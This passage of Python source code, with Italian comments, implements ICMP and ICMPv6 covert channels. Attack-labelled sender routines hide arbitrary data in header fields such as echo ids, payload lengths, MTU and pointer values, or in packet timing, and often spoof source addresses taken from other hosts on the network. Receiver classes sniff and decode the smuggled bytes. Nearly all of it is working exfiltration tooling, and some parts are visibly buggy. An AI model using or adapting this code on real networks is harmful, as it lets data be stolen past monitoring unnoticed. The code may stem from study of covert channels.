                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed)  /
                    ICMPv6ParamProblem(ptr=int.from_bytes(data[index:index+4]),type=TYPE_PARAMETER_PROBLEM) /
                    dummy_pkt
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface)  

            dummy_pkt=(
                IPerror6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed)  /
                ICMPv6EchoRequest(type=TYPE_INFORMATION_REQUEST, id=0, seq=1)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed)  /
                ICMPv6ParamProblem(type=TYPE_PARAMETER_PROBLEM,ptr=0xFFFFFFFF) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface) 
            if ans: 
                return True  
            return False  

        def ipv6_time_exceeded(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            TYPE_TIME_EXCEEDED= 3
            TYPE_INFORMATION_REPLY=129  
            
            for index in range(0, len(data), 4): 
                dummy_pkt=(
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=int.from_bytes(data[index:index+2]))  /
                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=int.from_bytes(data[index+2:index+4]), seq=0)
                )
                pkt=(
                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed)  /
                    ICMPv6TimeExceeded(type=TYPE_TIME_EXCEEDED) /
                    dummy_pkt
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface)  
            
            dummy_pkt=(
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=0xffff)  /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed)  /
                ICMPv6TimeExceeded(type=TYPE_TIME_EXCEEDED) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface) 
            if ans: 
                return True  
            return False
        
        def ipv6_packet_to_big(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ip(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            TYPE_PKT_BIG= 2
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129 
            
            for index in range(0, len(data), 8): 
                dummy_pkt=(
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=int.from_bytes(data[index+4:index+6]))  /
                    ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=int.from_bytes(data[index+6:index+8]), seq=0)
                )
                pkt=(
                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed)  /
                    ICMPv6PacketTooBig(type=TYPE_PKT_BIG, mtu=int.from_bytes(data[index:index+4])) /
                    dummy_pkt
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface)  

            dummy_pkt=(
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=0xffff)  /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed)  /
                ICMPv6PacketTooBig(type=TYPE_PKT_BIG, mtu=0) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface) 
            if ans: 
                return True  
            return False
        
        def ipv6_destination_unreachable(self, data:bytes=None): 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            TYPE_DESTINATION_UNREACHABLE=1 
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129  

            for index in range(0, len(data), 4): 
                dummy_pkt=(
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=int.from_bytes(data[index:index+2]))  /
                    ICMPv6EchoReply(type=128,id=int.from_bytes(data[index+2:index+4]), seq=0)
                )
                pkt=(
                    Ether(dst=dst_mac, src=src_mac) /
                    IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed)  /
                    ICMPv6DestUnreach(type=TYPE_DESTINATION_UNREACHABLE) /
                    dummy_pkt
                ) 
                #print(f"Sending {pkt.summary()} through interface {interface}")  
                ans = sendp(pkt, verbose=1,iface=interface)  
            dummy_pkt=(
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed, plen=0xffff)  /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY,id=0, seq=1)
            )
            pkt=(
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed)  /
                ICMPv6DestUnreach(type=TYPE_DESTINATION_UNREACHABLE) /
                dummy_pkt
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface) 
            if ans: 
                return True  
            return False

        def ipv6_timing_channel_1bit(self, data:bytes=None): #Exec Time 0:14:46
            #Nella comunicazione possono verificarsi turbolenze. 
            #Per poter distinguere i due tempi la distanza deve essere adeguata. 
            #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore 
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            TEMPO_0=3 #sec
            DISTANZA_TEMPI=2 #sec
            TEMPO_1=8 #sec
            if TEMPO_0+DISTANZA_TEMPI*2>=TEMPO_1: 
                raise ValueError("send_timing_channel: TEMPO_1 non valido")
            TEMPO_BYTE=0*60 #minuti

            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129 
            
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0) 
            bit_data=[]
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
            
            start_time=datetime.datetime.now(datetime.timezone.utc) 
            pkt= (
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed) /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                Raw(load="Hello Neighbour".encode())
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  
            for piece_bit_data in bit_data:
                for bit in piece_bit_data:
                    if bit: 
                        time.sleep(TEMPO_1) 
                    else: 
                        time.sleep(TEMPO_0)
                    current_time=datetime.datetime.now(datetime.timezone.utc)
                    pkt= (
                        Ether(dst=dst_mac, src=src_mac) /
                        IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed) /
                        ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                        Raw()
                    ) 
                    #print(f"Sending {pkt.summary()} through interface {interface}")  
                    ans = sendp(pkt, verbose=1,iface=interface) 
                time.sleep(TEMPO_BYTE)
            end_time=datetime.datetime.now(datetime.timezone.utc) 
        
        def ipv6_timing_channel_2bit(self, data:bytes=None): #Exec Time 12:08
            #Nella comunicazione possono verificarsi turbolenze. 
            #Per poter distinguere i due tempi la distanza deve essere adeguata. 
            #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            DISTANZA_TEMPI=2 #sec
            TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(2**2)] #00, 01, 10, 11
            #TEMPO_00=3, TEMPO_01=TEMPO_00+2*DISTANZA_TEMPI, TEMPO_10=TEMPO_01+2*DISTANZA_TEMPI, TEMPO_11=TEMPO_10+2*DISTANZA_TEMPI
            TEMPO_BYTE=0*60 #minuti  
            
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129 
            
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)  
            bit_data=[]
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)]
                
            start_time=datetime.datetime.now(datetime.timezone.utc)
            pkt= (
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed) /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                Raw()
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  
            for piece_bit_data in bit_data:
                for bit1, bit2 in zip(piece_bit_data[0::2], piece_bit_data[1::2]): 
                    time.sleep(TEMPI_CODICI[(bit1<<1)+bit2]) 
                    current_time=datetime.datetime.now(datetime.timezone.utc)
                    pkt= (
                        Ether(dst=dst_mac, src=src_mac) /
                        IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed) /
                        ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                        Raw()
                    ) 
                    #print(f"Sending {pkt.summary()} through interface {interface}")  
                    ans = sendp(pkt, verbose=1,iface=interface)  
                time.sleep(TEMPO_BYTE)
            end_time=datetime.datetime.now(datetime.timezone.utc) 
        
        def ipv6_timing_channel_4bit(self, data:bytes=None): #Exec Time 0:22:20.745110 
            #Nella comunicazione possono verificarsi turbolenze. 
            #Per poter distinguere i due tempi la distanza deve essere adeguata. 
            #Inoltre il tempo maggiore dovrà distare alemno 2d dal tempo minore
            if not IS_TYPE.bytes(data) or not IS_TYPE.ipaddress(ip_src) or not IS_TYPE.ipaddress(ip_dst):
                raise Exception(f"Argoemnti non corretti")
            if ip_dst.version!=6:
                print(f"IP version is not 6: {ip_dst.version}")
                return False
            
            DISTANZA_TEMPI=2 #sec
            TEMPI_CODICI=[3+index*2*DISTANZA_TEMPI for index in range(4**2)] #0000, 0001, 0010, 0011,...,1111
            TEMPO_BYTE=0*60 #minuti 
            
            TYPE_INFORMATION_REQUEST=128
            TYPE_INFORMATION_REPLY=129
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)
            
            midnight = datetime.datetime.now(datetime.timezone.utc).replace(hour=0, minute=0, second=0, microsecond=0)  
            bit_data=[]
            for piece_data in data: #BIG ENDIAN
                bit_data.append([(piece_data >> index) & 1 for index in range(8)]) #LSB
                #bit_data.append([(piece_data >> index) & 1 for index in reversed(range(8))]) #MSB
                bit_piece_data=[(piece_data >> index) & 1 for index in range(8)] 
            
            start_time=datetime.datetime.now(datetime.timezone.utc)
            pkt= (
                Ether(dst=dst_mac, src=src_mac) /
                IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ipaddress.ip_address(random.choice(self.host_attivi)).compressed if self.host_attivi else self.ip_src.compressed) /
                ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                Raw()
            ) 
            #print(f"Sending {pkt.summary()} through interface {interface}")  
            ans = sendp(pkt, verbose=1,iface=interface)  
            for piece_bit_data in bit_data:
                for bit1, bit2,bit3,bit4 in zip(piece_bit_data[0::4], piece_bit_data[1::4],piece_bit_data[2::4], piece_bit_data[3::4]):
                    index=bit1<<3 | bit2<<2 |  bit3<<1 | bit4  
                    time.sleep(TEMPI_CODICI[index])  
                    pkt= (
                        Ether(dst=dst_mac, src=src_mac) /
                        IPv6(dst=f"{ip_dst.compressed}%{interface}",src=ip_src.compressed) /
                        ICMPv6EchoReply(type=TYPE_INFORMATION_REPLY) /
                        Raw()
                    ) 
                    #print(f"Sending {pkt.summary()} through interface {interface}")  
                    ans = sendp(pkt, verbose=1,iface=interface)
                time.sleep(TEMPO_BYTE)
            end_time=datetime.datetime.now(datetime.timezone.utc) 


class ReceiveSingleton: 
    ip_dst=None
    host_attivi=None 
    attacco=None

    def __init__(self, attacco:Enum=None): 
        if not (attacco:=AttackType.get_attack_method(attacco)): 
            raise Exception(f"Attacco non corretto")
        print("Attacco scelto: ",attacco)
        self.attacco=attacco 
        self.ip_dst,err=NETWORK.IP.find_local_IP()
        if err: 
            raise Exception(f"ReceiveSingleton: {err}") 
        self.host_attivi=[] if not self.host_attivi else print("IP degli host attivi già inizialittati")
    
    def wait_data(self): 
        stop_flag={"value":False} 
        def get_filter():
            nonlocal self
            TYPE_ECHO_REQUEST=8
            TYPE_ECHO_REPLY=0 
            filter="icmp"
            filter=filter+f" and (icmp[0]=={TYPE_ECHO_REQUEST} or icmp[0]=={TYPE_ECHO_REPLY})"
            filter=filter+f" and dst {self.ip_dst.compressed}" 
            return filter 
        def stop_filter(pkt): 
            nonlocal stop_flag
            return stop_flag["value"] 
        def callback(pkt): 
            print("Pacchetto ricevuto: ", pkt.summary()) 
            #TYPE_ECHO_REQUEST=8
            #TYPE_ECHO_REPLY=0 
            nonlocal self, stop_flag
            if pkt.haslayer("ICMP") and pkt.haslayer("Raw") and (pkt["ICMP"].type==8 or pkt["ICMP"].type==0): 
                if pkt[ICMP].id==23 and MSG.START_SOURCES.value.encode() in pkt["Raw"].load: 
                    if MSG.END_SOURCES.value.encode() in pkt["Raw"].load: 
                        stop_flag["value"]=True 
                    IPsources=pkt["Raw"].load.decode().replace(MSG.START_SOURCES.value,"").replace(MSG.END_SOURCES.value,"").strip().split(";") 
                    for x in IPsources: 
                        try:
                            ipSRC=ipaddress.ip_address(x)
                            self.host_attivi.append(ipSRC) if ipSRC.version==self.ip_dst.version else print("IP versione non corretta: ",self.ip_dst.version," ", ipSRC)
                        except Exception as e:
                            print("Errore nell'aggiunta degli host attivi: ", e)
            elif pkt.haslayer("Padding"):
                print("Padding load: ", pkt["Padding"].load)
        def wait_host_attivi():  
            print("In ascolto dei pacchetti ICMP...")
            sniff(
                filter=get_filter()
                ,prn=callback
                ,store=False 
                ,stop_filter=stop_filter 
            ) 
        def match_IPv4(): 
            nonlocal self 
            match self.attacco: 
                case AttackType.ipv4_information: 
                    return self.IPV4_INFORMATION(self.ip_dst, self.host_attivi) 
                case AttackType.ipv4_timestamp: 
                    return self.IPV4_TIMESTAMP(self.ip_dst, self.ip_src)
                case AttackType.ipv4_redirect: 
                    return self.IPV4_REDIRECT(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_source_quench: 
                    return self.IPV4_SOURCE_QUENCH(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_parameter_problem: 
                    return self.IPV4_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_time_exceeded: 
                    return self.IPV4_TIME_EXCEEDED(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_destination_unreachable: 
                    return self.IPV4_DESTINATION_UNRECHABLE(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit: 
                    return self.IPV4_TIMING_8BIT(self.ip_dst, self.host_attivi)
                case AttackType.ipv4_timing_channel_8bit_noise: 
                    return self.IPV4_TIMING_8BIT_NOISE(self.ip_dst, self.host_attivi) 
                case _: raise Exception(f"Tipologia non conosciuta: {self.attacco}") 
        def match_IPv6(): 
            nonlocal self 
            match self.attacco: 
                #case AttackType.ipv6_information_reply: 
                #    ipv6_information_reply(data, ip_dst)
                case AttackType.ipv6_parameter_problem: 
                    return self.IPV6_PARAMETER_PROBLEM(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_time_exceeded: 
                    return self.IPV6_TIME_EXCEEDED(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_packet_to_big: 
                    return self.IPV6_PACKET_BIG(self.ip_dst, self.host_attivi)
                case AttackType.ipv6_destination_unreachable: 
                    return self.IPV6_DESTINTION_UNREACHABLE(self.ip_dst, self.host_attivi)
                case _: raise Exception(f"Tipologia non conosciuta: {self.attacco}") 

        wait_host_attivi() if not self.host_attivi or len(self.host_attivi)<0 else None
        if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.enum(self.attacco) and IS_TYPE.list(self.host_attivi)): 
            raise Exception(f"Argomenti non corretti") 
        if len(self.host_attivi)<=0: raise Exception("IP degli host attivi non presenti: ",self.host_attivi) 
        if self.ip_dst.version==4: 
            if (wait_class:=match_IPv4()): 
                return wait_class.data if wait_class.wait() else None
        elif self.ip_dst.version==6:
            if (wait_class:=match_IPv6()): 
                return wait_class.data if wait_class.wait() else None
        else:
            raise Exception(f"IP version non conosciuta: {self.ip_dst.version}") 
        return None
    
    class IPV4_INFORMATION: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:list[ipaddress.IPv4Address]=None):
            if not (IS_TYPE.ipaddress(ip_dst) and IS_TYPE.list(host_attivi)):  
                raise Exception("Argomenti non validi")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface 
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 

        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_INFORMATION_REQUEST, TYPE_INFORMATION_REPLY
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                #print("FILTRO: ", filter)
                return filter
            def callback(packet): 
                nonlocal self
                if packet.haslayer(IP) and packet.haslayer(ICMP):   
                    if packet[ICMP].id==0 and packet[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF  
                    self.data.extend([chr(byte1),chr(byte2)]) 
                    #print(f"Callback received: {byte1} / {byte2}")
                    #print(f"Callback received: {chr(byte1)} / {chr(byte2)}")
            #--------------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"wait_ipv4_information: Argomenti non corretti")  
            TYPE_INFORMATION_REQUEST=15 
            TYPE_INFORMATION_REPLY=16 
            try: 
                args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback 
                    #,"store":True 
                    ,"iface":self.interface
                }
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None 
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
            except Exception as e:
                raise Exception(f"wait_ipv4_information Eccezione: {e}")
            try: 
                THREADING_EVENT.wait(self.event_pktconn) 
                SNIFFER.stop(sniffer)
                if TIMER.stop(pkt_timer): 
                    joined="".join(self.data)
                    cleaned="".join(x for x in joined if x in string.printable) 
                    self.data=cleaned 
                    return True 
                return False 
            except Exception as e:
                raise Exception(f"wait_ipv4_information Eccezione: {e}")
        
    class IPV4_TIMESTAMP: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not (IS_TYPE.ipaddress(ip_dst) and IS_TYPE.list(host_attivi)): 
                raise Exception("Argomenti non validi")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 

        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_TIMESTAMP_REQUEST, TYPE_TIMESTAMP_REPLY
                filter="icmp" 
                filter=filter+f" and (icmp[0]=={TYPE_TIMESTAMP_REQUEST} or icmp[0]=={TYPE_TIMESTAMP_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}" 
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                return filter 
            def callback(packet): 
                nonlocal self
                if packet.haslayer(IP) and packet.haslayer(ICMP):  
                    if packet[ICMP].id==0 and packet[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return
                    icmp_id=packet[ICMP].id
                    byte1 = (icmp_id >> 8) & 0xFF 
                    byte2 = icmp_id & 0xFF  
                    self.data.extend([chr(byte1),chr(byte2)]) 
                
                    icmp_ts_ori=str(packet[ICMP].ts_ori)[-3:]  
                    icmp_ts_rx=str(packet[ICMP].ts_rx)[-3:]  
                    icmp_ts_tx=str(packet[ICMP].ts_tx)[-3:] 

                    self.data.extend([chr(int(icmp_ts_ori)),chr(int(icmp_ts_rx)), chr(int(icmp_ts_tx))]) 
            #---------------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_host) and IS_TYPE.list(self.data)): 
                raise Exception(f"ipv4_timestamp_request: Argomenti non corretti") 
            TYPE_TIMESTAMP_REQUEST=13
            TYPE_TIMESTAMP_REPLY=14  
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback
                    #,"store":True 
                    ,"iface":self.interface
                }
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            THREADING_EVENT.wait(self.event_pktconn) 
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                return True 
            return False  
    
    class IPV4_REDIRECT:
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 

        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_REDIRECT
                filter="icmp" 
                filter= f"icmp and (icmp[0]=={TYPE_REDIRECT}) and dst {self.ip_dst.compressed}" 
                if self.host_attivi and IS_TYPE.ipaddress(self.host_attivi):
                    filter+=f" and src {self.host_attivi.compressed}"
                else: print("No need to listen for the source")
                return filter
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                print("FILTRO: ", filter)
                return filter
            def callback(packet): 
                nonlocal self, TYPE_REDIRECT
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw) : 
                    inner_ip = IP(packet[Raw].load) 
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return  
                    elif not inner_ip: 
                        print("Pacchetto non ha livello IP error\t",packet.summary())  
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip.ttl.to_bytes(1,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    #
                    self.data.append(inner_ip[ICMP].id.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00')) 
                    self.data.append(inner_ip[ICMP].seq.to_bytes(2,"big").decode().lstrip('\x00').rstrip('\x00'))   
            #---------------------------------------------------------
            if not (IS_TYPE.ipaddress(self.ip_dst) and IS_TYPE.list(self.data)): 
                raise Exception(f"ipv4_redirect: Argomenti non corretti") 
            redirect_data=[] 
            TYPE_REDIRECT=5  
            args={
                    "filter": get_filter()
                    #,"count":1 
                    ,"prn": callback()
                    #,"store":True 
                    ,"iface":self.interface
            } 
            try: 
                sniffer,pkt_timer=SNIFFER.sniff_packet(
                    args
                    ,None
                    ,lambda: SNIFFER.template_timeout(self.event_pktconn)
                ) 
                THREADING_EVENT.wait(self.event_pktconn) 
            except Exception as e:
                raise Exception(f"wait_conn_from_attacker: {e}")
            SNIFFER.stop(sniffer)
            if TIMER.stop(pkt_timer): 
                joined="".join(self.data)
                cleaned="".join(x for x in joined if x in string.printable)
                self.data=cleaned 
                return True 
            return False  

    class IPV4_SOURCE_QUENCH: 
        event_pktconn=None
        ip_dst=None
        host_attivi=None
        interface=None
        data=None

        def __init__(self, ip_dst:ipaddress.IPv4Address, host_attivi:ipaddress.IPv4Address=None):
            if not IS_TYPE.ipaddress(ip_dst): 
                raise Exception("IP destinazione non valido") 
            if host_attivi and not IS_TYPE.ipaddress(host_attivi): 
                raise Exception("IP mittente non valido")
            self.event_pktconn=GET.threading_Event() 
            try:  
                self.interface= NETWORK.DEFAULT_INTERFACE().default_iface  
            except Exception as e:
                raise Exception(f"IPV4_INFORMATION_REQUEST: {e}") 
            self.data=[]
            self.ip_dst=ip_dst
            self.host_attivi=host_attivi 

        def wait(self): 
            def get_filter():
                nonlocal self, TYPE_SOURCE_QUENCH             
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_SOURCE_QUENCH})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                print("FILTRO: ", filter)
                return filter 
                filter="icmp"
                filter=filter+f" and (icmp[0]=={TYPE_INFORMATION_REQUEST} or icmp[0]=={TYPE_INFORMATION_REPLY})"
                filter=filter+f" and dst {self.ip_dst.compressed}"
                if IS_TYPE.list(self.host_attivi): 
                    filter+=f" and ("
                    for IPindex in range(len(self.host_attivi)): 
                        if IS_TYPE.ipaddress(self.host_attivi[IPindex]): 
                            if IPindex>0: 
                                filter+=" or "
                            filter+=f" src {self.host_attivi[IPindex].compressed}"
                    filter+=f")"
                else: print("No need to listen for the source")
                print("FILTRO: ", filter)
                return filter
            def callback(packet): 
                nonlocal self 
                TYPE_SOURCE_QUENCH=4 
                if packet.haslayer(IP) and packet.haslayer(ICMP) and packet.haslayer(Raw):  
                    inner_ip = IP(packet[Raw].load)
                    if inner_ip[ICMP].id==0 and inner_ip[ICMP].seq==1: 
                        THREADING_EVENT.set(self.event_pktconn)
                        return 
                    self.data.append(packet[ICMP].unused.to_bytes(4,"big").decode().lstrip('\x00').rstrip('\x00'))  
                    #
                    self.data.append(inner_ip.len.to_bytes(2,"big").decode())  
